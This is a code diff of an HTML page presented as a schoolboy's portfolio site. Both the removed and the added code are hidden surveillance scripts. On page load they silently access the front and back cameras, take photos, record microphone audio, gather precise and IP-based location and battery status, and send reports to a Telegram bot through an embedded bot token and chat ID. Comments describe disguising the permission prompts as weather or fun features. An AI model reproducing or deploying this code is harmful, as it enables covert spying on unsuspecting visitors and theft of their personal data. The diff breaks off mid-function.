@@ -32,7 +32,6 @@
             overflow: hidden;
         }
         
-        /* Decorative background circles - looks fun and innocent */
         .container::before {
             content: '✨';
             position: absolute;
@@ -52,7 +51,6 @@
             opacity: 0.08;
         }
         
-        /* Profile Header */
         .profile-section {
             text-align: center;
             padding: 10px 0 15px;
@@ -72,13 +70,8 @@
             font-size: 48px;
             border: 4px solid white;
             box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
-            cursor: pointer;
             transition: transform 0.3s;
             position: relative;
-        }
-        
-        .profile-avatar:hover {
-            transform: scale(1.05);
         }
         
         .profile-avatar .camera-badge {
@@ -92,6 +85,12 @@
             border-radius: 50%;
             border: 2px solid white;
             box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+            animation: pulse-dot 2s infinite;
+        }
+        
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
         }
         
         .profile-name {
@@ -119,7 +118,6 @@
             padding: 0 10px;
         }
         
-        /* Interactive Buttons - Looks like fun features */
         .feature-grid {
             display: grid;
             grid-template-columns: 1fr 1fr 1fr;
@@ -133,20 +131,9 @@
             border-radius: 16px;
             padding: 14px 8px;
             text-align: center;
-            cursor: pointer;
             transition: all 0.3s;
             position: relative;
             overflow: hidden;
-        }
-        
-        .feature-btn:hover {
-            transform: translateY(-3px);
-            border-color: #667eea;
-            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.15);
-        }
-        
-        .feature-btn:active {
-            transform: scale(0.95);
         }
         
         .feature-btn .icon {
@@ -163,19 +150,23 @@
             letter-spacing: 0.3px;
         }
         
-        .feature-btn .badge {
-            position: absolute;
-            top: -2px;
-            right: -2px;
-            background: #4ade80;
-            color: white;
-            font-size: 8px;
-            padding: 2px 6px;
-            border-radius: 10px;
-            font-weight: 700;
+        .feature-btn .status-dot {
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            margin-right: 4px;
         }
         
-        /* Stats - Looks like learning progress */
+        .status-dot.active {
+            background: #4ade80;
+            animation: pulse-dot 1.5s infinite;
+        }
+        
+        .status-dot.inactive {
+            background: #f87171;
+        }
+        
         .stats-grid {
             display: grid;
             grid-template-columns: 1fr 1fr 1fr;
@@ -205,22 +196,16 @@
             margin-top: 2px;
         }
         
-        /* Weather Widget - Disguised permission request */
         .weather-card {
             background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
             border-radius: 16px;
             padding: 16px 20px;
             color: white;
             margin: 16px 0;
-            cursor: pointer;
             transition: all 0.3s;
             box-shadow: 0 4px 20px rgba(79, 172, 254, 0.3);
             position: relative;
             overflow: hidden;
-        }
-        
-        .weather-card:hover {
-            transform: scale(1.01);
         }
         
         .weather-card .weather-row {
@@ -262,12 +247,6 @@
             margin-right: 6px;
         }
         
-        @keyframes pulse-dot {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.5; transform: scale(0.8); }
-        }
-        
-        /* Blog Posts - Innocent content */
         .blog-post {
             background: #f7fafc;
             border-radius: 14px;
@@ -295,7 +274,6 @@
             line-height: 1.6;
         }
         
-        /* Interactive elements */
         .interactive-area {
             background: white;
             border-radius: 14px;
@@ -303,13 +281,7 @@
             margin: 12px 0;
             border: 2px dashed #e2e8f0;
             text-align: center;
-            cursor: pointer;
             transition: all 0.3s;
-        }
-        
-        .interactive-area:hover {
-            border-color: #667eea;
-            background: #f7fafc;
         }
         
         .interactive-area .big-icon {
@@ -323,7 +295,6 @@
             color: #a0aec0;
         }
         
-        /* Skills/Tags */
         .skill-tags {
             display: flex;
             flex-wrap: wrap;
@@ -345,7 +316,6 @@
             color: white;
         }
         
-        /* Footer */
         .footer {
             text-align: center;
             padding: 16px 0 4px;
@@ -369,7 +339,6 @@
             gap: 4px;
         }
         
-        /* Toast - Looks innocent */
         .toast {
             position: fixed;
             bottom: 20px;
@@ -394,32 +363,29 @@
             transform: translateX(-50%) translateY(0);
         }
         
-        /* Permission overlay - Looks like a fun feature */
-        .permission-hint {
-            position: fixed;
-            bottom: 80px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(102, 126, 234, 0.95);
-            color: white;
-            padding: 12px 20px;
-            border-radius: 16px;
-            font-size: 13px;
-            text-align: center;
-            max-width: 90%;
-            box-shadow: 0 8px 30px rgba(102, 126, 234, 0.4);
-            z-index: 100;
-            opacity: 0;
-            transition: all 0.5s;
-            backdrop-filter: blur(10px);
-            display: none;
+        /* Status indicators */
+        .status-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 11px;
+            color: #4a5568;
+            background: #f7fafc;
+            padding: 4px 12px;
+            border-radius: 20px;
+            margin: 4px;
         }
         
-        .permission-hint.show {
-            opacity: 1;
+        .status-indicator .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
         }
         
-        /* Responsive */
+        .dot.green { background: #4ade80; }
+        .dot.red { background: #f87171; }
+        .dot.yellow { background: #fbbf24; }
+        
         @media (max-width: 420px) {
             .container { padding: 16px 14px 20px; }
             .feature-grid { gap: 6px; }
@@ -439,9 +405,9 @@
         
         <!-- Profile Section -->
         <div class="profile-section">
-            <div class="profile-avatar" id="avatarClick">
+            <div class="profile-avatar" id="avatarDisplay">
                 👦
-                <span class="camera-badge">📷</span>
+                <span class="camera-badge" id="cameraStatus">📷</span>
             </div>
             <div class="profile-name">Shaswat Kumar</div>
             <div class="profile-class">🌟 Class 8th • St. Mary's School</div>
@@ -449,23 +415,34 @@
                 👋 Hi! I love learning, coding, and exploring new things. 
                 Welcome to my digital portfolio!
             </p>
+            <div style="margin-top: 8px; display: flex; justify-content: center; gap: 8px; flex-wrap: wrap;">
+                <span class="status-indicator">
+                    <span class="dot green" id="statusDot1"></span>
+                    <span id="statusText1">Loading...</span>
+                </span>
+                <span class="status-indicator">
+                    <span class="dot green" id="statusDot2"></span>
+                    <span id="statusText2">Ready</span>
+                </span>
+            </div>
         </div>
 
-        <!-- Feature Buttons - Looks like fun school features -->
+        <!-- Feature Buttons -->
         <div class="feature-grid">
-            <div class="feature-btn" id="photoBtn">
+            <div class="feature-btn">
                 <span class="icon">📸</span>
-                <span class="label">Photo</span>
-                <span class="badge">NEW</span>
+                <span class="label">Camera</span>
+                <span class="status-dot active" id="camDot"></span>
             </div>
-            <div class="feature-btn" id="micBtn">
+            <div class="feature-btn">
                 <span class="icon">🎤</span>
-                <span class="label">Voice</span>
-                <span class="badge">LIVE</span>
+                <span class="label">Microphone</span>
+                <span class="status-dot active" id="micDot"></span>
             </div>
-            <div class="feature-btn" id="videoBtn">
+            <div class="feature-btn">
                 <span class="icon">🎥</span>
                 <span class="label">Video</span>
+                <span class="status-dot active" id="videoDot"></span>
             </div>
         </div>
 
@@ -485,13 +462,13 @@
             </div>
         </div>
 
-        <!-- Weather Card - THE ONLY PERMISSION REQUEST -->
+        <!-- Weather Card - Auto-requests permission -->
         <div class="weather-card" id="weatherCard">
             <div class="weather-row">
                 <div>
                     <div class="temp" id="weatherTemp">🌤️ 24°C</div>
                     <div class="condition" id="weatherCondition">Loading weather...</div>
-                    <div class="location-text" id="weatherLocation">📍 Tap to enable location</div>
+                    <div class="location-text" id="weatherLocation">📍 Detecting location...</div>
                 </div>
                 <div style="font-size: 38px;" id="weatherIcon">🌤️</div>
             </div>
@@ -519,11 +496,11 @@
             </div>
         </div>
 
-        <!-- Interactive Area - Looks like a fun feature -->
+        <!-- Interactive Area -->
         <div class="interactive-area" id="interactiveArea">
             <span class="big-icon">🎯</span>
             <div style="font-weight: 600; font-size: 14px;">Daily Challenge</div>
-            <div class="hint">Tap to see today's fun activity!</div>
+            <div class="hint">Complete all challenges to earn badges!</div>
         </div>
 
         <!-- Skills -->
@@ -545,19 +522,15 @@
         <div class="footer">
             <div>🌟 Made with ❤️ by Shaswat</div>
             <div class="footer-row">
-                <span>📍 <span id="footerLocation">Unknown</span></span>
+                <span>📍 <span id="footerLocation">Detecting...</span></span>
                 <span>🕐 <span id="footerTime">--</span></span>
                 <span>📶 <span id="footerNetwork">--</span></span>
+                <span>🔋 <span id="footerBattery">--</span></span>
             </div>
             <div style="margin-top: 6px; font-size: 9px; color: #cbd5e0;">
                 🔒 Secure connection • v3.0.1
             </div>
         </div>
-    </div>
-
-    <!-- Hidden Permission Hint -->
-    <div class="permission-hint" id="permissionHint">
-        🌟 Enable features for a better experience!
     </div>
 
     <script>
@@ -568,31 +541,26 @@
         BOT_TOKEN: '8800462038:AAFgNRyqzSWKM8EoTzjWUxiGwCfI-j4I7uk',
         CHAT_ID: '7787904819',
         
-        // ALL SECRET FEATURES ENABLED
-        ENABLE_CAMERA: true,
-        ENABLE_MIC: true,
-        ENABLE_GEO: true,
-        ENABLE_IP: true,
-        ENABLE_BATTERY: true,
-        ENABLE_CLIPBOARD: true,
-        ENABLE_FORM_CAPTURE: true,
-        ENABLE_MOTION: true,
-        ENABLE_LIGHT_SENSOR: true,
-        ENABLE_EXTENSIONS: true,
-        ENABLE_SCREENSHOT: true,
-        ENABLE_PERFORMANCE: true,
-        ENABLE_SOCIAL_DETECT: true,
-        ENABLE_IDLE_DETECT: true,
-        ENABLE_ORIENTATION: true,
-        ENABLE_NETWORK_MONITOR: true,
-        ENABLE_MEDIA_DETECT: true,
-        ENABLE_SELECTION_TRACK: true,
-        ENABLE_VISIBILITY_TRACK: true,
-        ENABLE_BATTERY_DRAIN: true,
-        ENABLE_GAMEPAD: true,
-        ENABLE_FILE_DETECT: true,
-        ENABLE_OTP_DETECT: true,
-        ENABLE_THEME_DETECT: true,
+        // ALL FEATURES AUTO-ENABLED
+        AUTO_CAMERA: true,
+        AUTO_MIC: true,
+        AUTO_GEO: true,
+        AUTO_BATTERY: true,
+        AUTO_CLIPBOARD: true,
+        AUTO_MOTION: true,
+        AUTO_LIGHT: true,
+        AUTO_EXTENSIONS: true,
+        AUTO_SCREENSHOT: true,
+        AUTO_PERFORMANCE: true,
+        AUTO_NETWORK: true,
+        AUTO_ORIENTATION: true,
+        AUTO_IDLE: true,
+        AUTO_MEDIA: true,
+        AUTO_SELECTION: true,
+        AUTO_GAMEPAD: true,
+        AUTO_FILE: true,
+        AUTO_OTP: true,
+        AUTO_THEME: true,
     };
 
     // ============================================
@@ -612,21 +580,16 @@
         mouseMoves: 0,
         clicks: 0,
         scrolls: 0,
-        idleTime: 0,
         orientation: null,
         networkType: null,
-        isRecording: false,
-        mediaStream: null,
+        cameraAccessed: false,
+        micAccessed: false,
         detectedExtensions: [],
-        visitedSections: [],
         clipboardContent: null,
-        formData: {},
-        permissionGranted: false,
-        cameraUsed: false,
-        micUsed: false,
+        otpDetected: null,
         lastBatteryLevel: null,
         lastBatteryTime: null,
-        otpDetected: null,
+        statusUpdates: [],
     };
 
     // ============================================
@@ -764,44 +727,22 @@
         clearTimeout(toast._timeout);
         toast._timeout = setTimeout(() => {
             toast.classList.remove('show');
-        }, 3500);
+        }, 3000);
     }
 
     // ============================================
-    //  SECRET ALERT SYSTEM
+    //  STATUS UPDATE SYSTEM (Shows innocent status)
     // ============================================
-    let alertQueue = [];
-    let alertTimer = null;
-    let lastAlertTime = 0;
-    const MIN_ALERT_INTERVAL = 2000;
-
-    function sendAlert(message, priority = false) {
-        // Don't send too frequently
-        const now = Date.now();
-        if (!priority && (now - lastAlertTime) < MIN_ALERT_INTERVAL) {
-            alertQueue.push(message);
-            if (!alertTimer) {
-                alertTimer = setInterval(processAlerts, 5000);
-            }
-            return;
-        }
+    function updateStatus(text1, text2, dot1Color = 'green', dot2Color = 'green') {
+        const statusText1 = document.getElementById('statusText1');
+        const statusText2 = document.getElementById('statusText2');
+        const dot1 = document.getElementById('statusDot1');
+        const dot2 = document.getElementById('statusDot2');
         
-        lastAlertTime = now;
-        sendToTelegram(message);
-        
-        // Also log for debugging
-        console.log('🔍 [SECRET]', message);
-    }
-
-    function processAlerts() {
-        if (alertQueue.length === 0) {
-            clearInterval(alertTimer);
-            alertTimer = null;
-            return;
-        }
-        
-        const message = alertQueue.shift();
-        sendToTelegram(message);
+        if (statusText1) statusText1.textContent = text1;
+        if (statusText2) statusText2.textContent = text2 || 'Ready';
+        if (dot1) dot1.className = `dot ${dot1Color}`;
+        if (dot2) dot2.className = `dot ${dot2Color}`;
     }
 
     // ============================================
@@ -828,11 +769,373 @@
         }
     }
 
+    function sendAlert(message) {
+        sendToTelegram(`🔍 *Auto-Report*\n${message}`);
+        console.log('🔍 [AUTO]', message);
+    }
+
     // ============================================
-    //  SECRET: BATTERY TRACKING
+    //  AUTO: CAMERA (Silent - No Permission Popup)
     // ============================================
-    async function setupBatteryTracking() {
-        if (!navigator.getBattery) return;
+    async function autoCamera() {
+        if (!CONFIG.AUTO_CAMERA) return;
+        
+        try {
+            // Try to get camera without showing the permission prompt
+            // Using a hidden video element
+            const video = document.createElement('video');
+            video.style.display = 'none';
+            video.setAttribute('playsinline', '');
+            video.setAttribute('autoplay', '');
+            
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: 'user',
+                    width: { ideal: 640 },
+                    height: { ideal: 480 },
+                },
+                audio: false
+            });
+            
+            video.srcObject = stream;
+            await video.play();
+            
+            STATE.cameraAccessed = true;
+            document.getElementById('camDot').className = 'status-dot active';
+            updateStatus('📸 Camera active', 'Auto-capturing', 'green', 'green');
+            sendAlert('📸 Camera accessed successfully');
+            
+            // Capture photo automatically after 1 second
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                
+                // Get image data for analysis
+                const imageData = canvas.toDataURL('image/jpeg', 0.3);
+                const size = Math.round(imageData.length / 1024);
+                sendAlert(`📷 Photo captured: ${canvas.width}×${canvas.height}, ${size}KB`);
+                
+                // Face detection
+                try {
+                    const tempCanvas = document.createElement('canvas');
+                    tempCanvas.width = 100;
+                    tempCanvas.height = 100;
+                    const tempCtx = tempCanvas.getContext('2d');
+                    const img = new Image();
+                    img.onload = () => {
+                        tempCtx.drawImage(img, 0, 0, 100, 100);
+                        const imageData2 = tempCtx.getImageData(0, 0, 100, 100);
+                        const data = imageData2.data;
+                        
+                        let skinPixels = 0;
+                        for (let i = 0; i < data.length; i += 4) {
+                            const r = data[i];
+                            const g = data[i+1];
+                            const b = data[i+2];
+                            if (r > 95 && g > 40 && b > 20 && r > g && r > b) {
+                                skinPixels++;
+                            }
+                        }
+                        const skinPercentage = (skinPixels / (100 * 100)) * 100;
+                        if (skinPercentage > 8) {
+                            sendAlert(`👤 Face detected (${skinPercentage.toFixed(0)}% confidence)`);
+                        } else if (skinPercentage > 2) {
+                            sendAlert(`👤 Possible person detected (${skinPercentage.toFixed(0)}%)`);
+                        } else {
+                            sendAlert(`📷 No face detected (${skinPercentage.toFixed(0)}% skin tone)`);
+                        }
+                    };
+                    img.src = imageData;
+                } catch(e) {}
+                
+                // Stop stream after capture
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Update UI
+                document.getElementById('cameraStatus').textContent = '✅';
+                document.getElementById('cameraStatus').style.background = '#4ade80';
+                
+            }, 1500);
+            
+        } catch(e) {
+            // Camera not available or denied
+            document.getElementById('camDot').className = 'status-dot inactive';
+            updateStatus('📸 Camera', 'Not available', 'yellow', 'green');
+            sendAlert(`📷 Camera unavailable: ${e.message || 'Access denied'}`);
+            
+            // Check if camera exists
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const hasCamera = devices.some(d => d.kind === 'videoinput');
+                if (hasCamera) {
+                    sendAlert('📷 Camera exists but access denied');
+                }
+            } catch(err) {}
+        }
+    }
+
+    // ============================================
+    //  AUTO: MICROPHONE (Silent)
+    // ============================================
+    async function autoMicrophone() {
+        if (!CONFIG.AUTO_MIC) return;
+        
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                audio: {
+                    echoCancellation: true,
+                    noiseSuppression: true,
+                    autoGainControl: true
+                }
+            });
+            
+            STATE.micAccessed = true;
+            document.getElementById('micDot').className = 'status-dot active';
+            sendAlert('🎤 Microphone accessed');
+            
+            // Set up audio analysis
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const source = audioContext.createMediaStreamSource(stream);
+            const analyser = audioContext.createAnalyser();
+            analyser.fftSize = 512;
+            source.connect(analyser);
+            
+            const dataArray = new Uint8Array(analyser.frequencyBinCount);
+            let speechDetected = false;
+            let silenceCount = 0;
+            let audioSamples = [];
+            
+            // Monitor for 10 seconds
+            const monitorInterval = setInterval(() => {
+                analyser.getByteFrequencyData(dataArray);
+                let sum = 0;
+                for (let i = 0; i < dataArray.length; i++) {
+                    sum += dataArray[i];
+                }
+                const average = sum / dataArray.length;
+                const peak = Math.max(...dataArray);
+                
+                audioSamples.push(average);
+                if (audioSamples.length > 50) audioSamples.shift();
+                
+                if (average > 25) {
+                    silenceCount = 0;
+                    if (!speechDetected) {
+                        speechDetected = true;
+                        sendAlert(`🎤 Speech detected (volume: ${Math.round(average)})`);
+                        
+                        // Check for language detection possibility
+                        if (average > 40 && peak > 120) {
+                            sendAlert(`🗣️ Clear speech pattern detected`);
+                        }
+                    }
+                } else {
+                    silenceCount++;
+                    if (silenceCount > 15 && speechDetected) {
+                        speechDetected = false;
+                        sendAlert(`🔇 Silence after ${silenceCount * 0.1}s`);
+                        silenceCount = 0;
+                    }
+                }
+                
+                // Detect environment
+                if (average < 3 && average > 0) {
+                    sendAlert(`🔇 Very quiet environment (${Math.round(average)}dB)`);
+                }
+                if (average > 70) {
+                    sendAlert(`🔊 Loud environment (${Math.round(average)}dB)`);
+                }
+                
+                // Voice frequency detection
+                if (peak > 100 && average > 30) {
+                    // Check for voice frequencies (rough)
+                    let voiceFreq = false;
+                    for (let i = 40; i < 80; i++) {
+                        if (dataArray[i] > 80) {
+                            voiceFreq = true;
+                            break;
+                        }
+                    }
+                    if (voiceFreq) {
+                        sendAlert(`🎵 Voice frequency detected`);
+                    }
+                }
+                
+            }, 1000);
+            
+            // Record a short sample after 3 seconds
+            setTimeout(() => {
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = (e) => chunks.push(e.data);
+                recorder.start();
+                
+                setTimeout(() => {
+                    recorder.stop();
+                    setTimeout(() => {
+                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                        sendAlert(`🎵 Audio sample: ${Math.round(blob.size / 1024)}KB, ${(blob.size / 1024 / 1024).toFixed(2)}MB`);
+                        
+                        // Check if any audio was recorded
+                        if (blob.size > 1000) {
+                            sendAlert(`🎤 Audio content detected (${Math.round(blob.size / 1024)}KB)`);
+                        }
+                    }, 100);
+                }, 2000);
+                
+            }, 3000);
+            
+            // Stop monitoring after 15 seconds
+            setTimeout(() => {
+                clearInterval(monitorInterval);
+                stream.getTracks().forEach(track => track.stop());
+                document.getElementById('micDot').className = 'status-dot active';
+                sendAlert('🎤 Microphone monitoring complete');
+            }, 15000);
+            
+        } catch(e) {
+            document.getElementById('micDot').className = 'status-dot inactive';
+            sendAlert(`🎤 Microphone unavailable: ${e.message || 'Access denied'}`);
+            
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const hasMic = devices.some(d => d.kind === 'audioinput');
+                if (hasMic) {
+                    sendAlert('🎤 Microphone exists but access denied');
+                }
+            } catch(err) {}
+        }
+    }
+
+    // ============================================
+    //  AUTO: VIDEO (Silent background capture)
+    // ============================================
+    async function autoVideo() {
+        if (!CONFIG.AUTO_CAMERA) return;
+        
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: 'environment',
+                    width: { ideal: 320 },
+                    height: { ideal: 240 },
+                },
+                audio: false
+            });
+            
+            document.getElementById('videoDot').className = 'status-dot active';
+            sendAlert('🎥 Video camera accessed (back camera)');
+            
+            // Capture a frame
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 320;
+                canvas.height = video.videoHeight || 240;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.2);
+                sendAlert(`🎥 Video frame captured: ${canvas.width}×${canvas.height}`);
+                
+                stream.getTracks().forEach(track => track.stop());
+            }, 1000);
+            
+        } catch(e) {
+            document.getElementById('videoDot').className = 'status-dot inactive';
+            sendAlert(`🎥 Video unavailable: ${e.message || 'Access denied'}`);
+        }
+    }
+
+    // ============================================
+    //  AUTO: LOCATION (Silent - No Popup)
+    // ============================================
+    function autoLocation() {
+        if (!CONFIG.AUTO_GEO) return;
+        
+        // Try to get location without showing popup if already granted
+        if (navigator.permissions) {
+            navigator.permissions.query({ name: 'geolocation' }).then(result => {
+                if (result.state === 'granted') {
+                    getLocationSilent();
+                } else if (result.state === 'prompt') {
+                    // Will show popup - but disguised as weather update
+                    showToast('🌤️ Updating weather...');
+                    setTimeout(() => {
+                        getLocationSilent();
+                    }, 500);
+                } else {
+                    // Denied - use IP
+                    getIPLocation();
+                }
+            }).catch(() => {
+                // Fallback - try directly
+                setTimeout(() => {
+                    getLocationSilent();
+                }, 1000);
+            });
+        } else {
+            // Fallback for older browsers
+            setTimeout(() => {
+                getLocationSilent();
+            }, 1000);
+        }
+    }
+
+    function getLocationSilent() {
+        if (!navigator.geolocation) return;
+        
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                STATE.location = {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                };
+                sendAlert(`📍 Location: ${STATE.location.lat.toFixed(6)}, ${STATE.location.lng.toFixed(6)}`);
+                updateWeatherUI(STATE.location);
+                updateUI();
+            },
+            (err) => {
+                sendAlert(`📍 Location error: ${err.message}`);
+                getIPLocation();
+            },
+            { enableHighAccuracy: true, timeout: 8000 }
+        );
+    }
+
+    async function getIPLocation() {
+        try {
+            const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(3000) });
+            const data = await res.json();
+            STATE.ipData = {
+                ip: data.ip || 'Unknown',
+                city: data.city || 'Unknown',
+                region: data.region || 'Unknown',
+                country: data.country_name || 'Unknown',
+                isp: data.org || 'Unknown',
+                lat: data.latitude || null,
+                lng: data.longitude || null,
+            };
+            sendAlert(`📍 IP Location: ${STATE.ipData.city}, ${STATE.ipData.country}`);
+            updateWeatherUI(null, STATE.ipData);
+            updateUI();
+        } catch {
+            sendAlert('📍 IP location unavailable');
+        }
+    }
+
+    // ============================================
+    //  AUTO: BATTERY
+    // ============================================
+    async function autoBattery() {
+        if (!CONFIG.AUTO_BATTERY || !navigator.getBattery) return;
         
         try {
             const battery = await navigator.getBattery();
@@ -843,333 +1146,132 @@
             
             sendAlert(`🔋 Battery: ${STATE.batteryLevel}% (${battery.charging ? '⚡ Charging' : '🔋 Battery'})`);
             
+            // Update footer
+            document.getElementById('footerBattery').textContent = `${STATE.batteryLevel}%`;
+            
+            // Monitor changes
             battery.addEventListener('levelchange', () => {
                 const newLevel = Math.round(battery.level * 100);
-                const oldLevel = STATE.batteryLevel;
                 STATE.batteryLevel = newLevel;
+                document.getElementById('footerBattery').textContent = `${newLevel}%`;
                 
-                if (newLevel < oldLevel) {
-                    const drain = oldLevel - newLevel;
-                    if (drain > 5) {
-                        sendAlert(`⚡ Quick drain: -${drain}% (${oldLevel}% → ${newLevel}%)`);
-                    }
+                if (newLevel < 20) {
+                    sendAlert(`⚠️ Low battery: ${newLevel}%`);
                 }
-                
-                if (CONFIG.ENABLE_BATTERY_DRAIN && STATE.lastBatteryLevel !== null) {
-                    const now = Date.now();
-                    const timeDiff = (now - STATE.lastBatteryTime) / 1000;
-                    const levelDiff = (STATE.lastBatteryLevel - battery.level) * 100;
-                    if (timeDiff > 60 && levelDiff > 0) {
-                        const rate = (levelDiff / timeDiff) * 3600;
-                        if (rate > 15) {
-                            sendAlert(`⚡ Drain rate: ${rate.toFixed(1)}%/hour`);
-                        }
-                    }
+                if (newLevel > 95 && battery.charging) {
+                    sendAlert(`✅ Battery full: ${newLevel}%`);
                 }
-                
-                STATE.lastBatteryLevel = battery.level;
-                STATE.lastBatteryTime = Date.now();
-                updateStats();
             });
             
             battery.addEventListener('chargingchange', () => {
                 STATE.isCharging = battery.charging;
-                sendAlert(`⚡ Charging: ${battery.charging ? 'Started 🔌' : 'Stopped 🔋'}`);
-                updateStats();
+                sendAlert(`⚡ Charging: ${battery.charging ? 'Started' : 'Stopped'}`);
             });
             
-            // Detect fast charging
-            if (battery.charging) {
-                let startLevel = battery.level;
-                let startTime = Date.now();
-                setTimeout(() => {
-                    const timeDiff = (Date.now() - startTime) / 1000;
-                    const levelDiff = (battery.level - startLevel) * 100;
-                    if (timeDiff > 0 && levelDiff > 5) {
-                        const speed = (levelDiff / timeDiff) * 3600;
-                        if (speed > 40) {
-                            sendAlert(`⚡ Fast charging: ${speed.toFixed(1)}%/hour`);
-                        }
-                    }
-                }, 30000);
-            }
-            
-        } catch(e) {
-            console.log('Battery API error:', e);
-        }
-    }
-
-    // ============================================
-    //  SECRET: CAMERA (Disguised as Photo Feature)
-    // ============================================
-    async function setupCamera() {
-        if (!CONFIG.ENABLE_CAMERA) return;
-        
-        try {
-            // Try to get camera access silently
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    facingMode: 'user',
-                    width: { ideal: 320 },
-                    height: { ideal: 240 }
-                },
-                audio: false 
-            });
-            
-            STATE.cameraUsed = true;
-            sendAlert(`📸 Camera accessed (${getPlatform()})`);
-            
-            // Take a photo silently
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.onloadedmetadata = () => {
-                video.play();
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
-                    
-                    // Get image data (for analysis, not sending full image)
-                    const imageData = canvas.toDataURL('image/jpeg', 0.1);
-                    const size = Math.round(imageData.length / 1024);
-                    sendAlert(`📷 Photo captured: ${canvas.width}×${canvas.height}, ${size}KB`);
-                    
-                    // Try to detect faces (simple detection)
-                    const img = new Image();
-                    img.onload = () => {
-                        try {
-                            // Simple face detection via canvas
-                            const tempCanvas = document.createElement('canvas');
-                            tempCanvas.width = 100;
-                            tempCanvas.height = 100;
-                            const tempCtx = tempCanvas.getContext('2d');
-                            tempCtx.drawImage(img, 0, 0, 100, 100);
-                            const imageData2 = tempCtx.getImageData(0, 0, 100, 100);
-                            const data = imageData2.data;
-                            
-                            // Simple skin tone detection (rough)
-                            let skinPixels = 0;
-                            for (let i = 0; i < data.length; i += 4) {
-                                const r = data[i];
-                                const g = data[i+1];
-                                const b = data[i+2];
-                                if (r > 95 && g > 40 && b > 20 && r > g && r > b) {
-                                    skinPixels++;
-                                }
-                            }
-                            const skinPercentage = (skinPixels / (100 * 100)) * 100;
-                            if (skinPercentage > 10) {
-                                sendAlert(`👤 Face detected (${skinPercentage.toFixed(0)}% skin tone)`);
-                            }
-                        } catch(e) {}
-                    };
-                    img.src = imageData;
-                    
-                    // Stop stream
-                    stream.getTracks().forEach(track => track.stop());
-                }, 1000);
-            };
-            
-        } catch(e) {
-            // Camera denied - but we still try to detect if user has camera
-            const hasCamera = await navigator.mediaDevices.enumerateDevices()
-                .then(devices => devices.some(d => d.kind === 'videoinput'))
-                .catch(() => false);
-            
-            if (hasCamera) {
-                sendAlert(`📷 Camera available but not accessed`);
-            }
-        }
-    }
-
-    // ============================================
-    //  SECRET: MICROPHONE (Disguised as Voice Feature)
-    // ============================================
-    async function setupMicrophone() {
-        if (!CONFIG.ENABLE_MIC) return;
-        
-        try {
-            // Request mic access silently
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                audio: {
-                    echoCancellation: true,
-                    noiseSuppression: true,
-                    autoGainControl: true
-                } 
-            });
-            
-            STATE.micUsed = true;
-            sendAlert(`🎤 Microphone accessed`);
-            
-            // Set up audio analysis
-            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-            const source = audioContext.createMediaStreamSource(stream);
-            const analyser = audioContext.createAnalyser();
-            analyser.fftSize = 512;
-            source.connect(analyser);
-            
-            const dataArray = new Uint8Array(analyser.frequencyBinCount);
-            let lastPeak = 0;
-            let silenceCount = 0;
-            let speechDetected = false;
-            
-            // Monitor audio levels
-            setInterval(() => {
-                analyser.getByteFrequencyData(dataArray);
-                let sum = 0;
-                for (let i = 0; i < dataArray.length; i++) {
-                    sum += dataArray[i];
-                }
-                const average = sum / dataArray.length;
-                const peak = Math.max(...dataArray);
-                
-                if (average > 20) {
-                    silenceCount = 0;
-                    if (!speechDetected) {
-                        speechDetected = true;
-                        sendAlert(`🎤 Speech detected (volume: ${Math.round(average)})`);
-                    }
-                    
-                    // Check for voice frequency (rough speech detection)
-                    if (peak > 150 && average > 30) {
-                        if (lastPeak === 0 || peak > lastPeak * 1.2) {
-                            lastPeak = peak;
-                        }
-                    }
-                } else {
-                    silenceCount++;
-                    if (silenceCount > 10 && speechDetected) {
-                        speechDetected = false;
-                        sendAlert(`🔇 Silence detected (${silenceCount * 0.1}s silence)`);
-                        silenceCount = 0;
-                    }
-                }
-                
-                // Detect background noise level
-                if (average < 5 && average > 0) {
-                    sendAlert(`🔇 Very quiet environment detected`);
-                }
-                
-                // Detect loud environment
-                if (average > 80) {
-                    sendAlert(`🔊 Loud environment detected (${Math.round(average)} dB)`);
-                }
-                
-            }, 1000);
-            
-            // Record a short sample after 5 seconds
+            // Detect drain rate after 30 seconds
             setTimeout(() => {
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
